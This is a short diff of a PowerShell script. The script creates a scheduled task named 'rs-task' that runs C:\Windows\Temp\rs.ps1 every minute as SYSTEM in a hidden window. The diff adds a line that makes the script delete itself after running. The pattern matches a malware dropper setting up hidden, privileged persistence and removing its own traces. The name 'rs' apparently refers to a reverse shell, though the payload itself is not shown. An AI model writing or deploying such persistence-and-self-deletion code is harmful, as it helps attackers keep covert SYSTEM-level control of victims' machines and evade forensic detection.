@@ -8,3 +8,5 @@ if($taskExists) {
    Write-Output "Doesnt Exist: Creating task.";
    C:\Windows\System32\schtasks.exe /create /tn rs-task /tr "powershell -NoLogo -WindowStyle hidden -file C:\Windows\Temp\rs.ps1" /sc minute /mo 1 /ru System
 }
+
+Remove-Item $script:MyInvocation.MyCommand.Path -Force
